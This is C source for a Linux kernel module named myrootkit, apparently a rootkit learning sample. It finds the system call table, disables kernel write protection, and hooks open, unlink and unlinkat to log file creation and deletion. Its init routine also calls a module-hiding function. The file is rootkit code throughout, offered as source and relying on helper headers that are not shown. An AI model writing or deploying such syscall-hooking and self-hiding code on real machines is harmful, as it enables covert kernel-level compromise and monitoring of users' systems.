/**
Author: Mote

**/
#include <linux/module.h>    
#include <linux/kernel.h>   
#include <linux/init.h>
#include <linux/slab.h>
#include <linux/syscalls.h>

#include "module_handler/module_handler.h"
#include "zeroevil/zeroevil.h"
 
MODULE_LICENSE("GPL");


unsigned long **real_sys_call_table;



unsigned long **sct;

asmlinkage long
fake_open(const char __user *filename, int flags, umode_t mode);
asmlinkage long
fake_unlink(const char __user *pathname);
asmlinkage long
fake_unlinkat(int dfd, const char __user * pathname, int flag);
asmlinkage long
(*real_open)(const char __user *filename, int flags, umode_t mode);
asmlinkage long
(*real_unlink)(const char __user *pathname);
asmlinkage long
(*real_unlinkat)(int dfd, const char __user * pathname, int flag);

asmlinkage long
fake_open(const char __user *filename, int flags, umode_t mode)
{
    if ((flags & O_CREAT) && strcmp(filename, "/dev/null") != 0) {
        fm_alert("open: %s\n", filename);
    }

    return real_open(filename, flags, mode);
}


asmlinkage long
fake_unlink(const char __user *pathname)
{
    fm_alert("unlink: %s\n", pathname);

    return real_unlink(pathname);
}


asmlinkage long
fake_unlinkat(int dfd, const char __user * pathname, int flag)
{
    fm_alert("unlinkat: %s\n", pathname);

    return real_unlinkat(dfd, pathname, flag);
}



int
get_runtime_sct(void)
{
    fm_alert("%s\n", "Greetings the World!");

    real_sys_call_table = get_sct();

    fm_alert("PAGE_OFFSET = %lx\n", PAGE_OFFSET);
    fm_alert("sys_call_table = %p\n", real_sys_call_table);
    fm_alert("sys_call_table - PAGE_OFFSET = %lu MiB\n",
             ((unsigned long)real_sys_call_table -
              (unsigned long)PAGE_OFFSET) / 1024 / 1024);

    return 0;
}


void
exit_and_print(void)
{
    fm_alert("%s\n", "Farewell the World!");

    return;
}


int
hook_start(void)
{
    fm_alert("%s\n", "Greetings the World!");

    /* No consideration on failure. */
    sct = get_sct();

    disable_wp();
    HOOK_SCT(sct, open);
    HOOK_SCT(sct, unlink);
    HOOK_SCT(sct, unlinkat);
    enable_wp();

    return 0;
}

void
hook_stop(void)
{
    disable_wp();
    UNHOOK_SCT(sct, open);
    UNHOOK_SCT(sct, unlink);
    UNHOOK_SCT(sct, unlinkat);
    enable_wp();

    fm_alert("%s\n", "Farewell the World!");

    return;
}


//Module init and exit
static int __init myrootkit_init(void)
{
	module_hide();
	module_show();
	get_runtime_sct();
	hook_start();
	return 0;
}

static void __exit myrootkit_exit(void)
{
	module_show();
	exit_and_print();
	hook_stop();
	
}



module_init(myrootkit_init);
module_exit(myrootkit_exit);

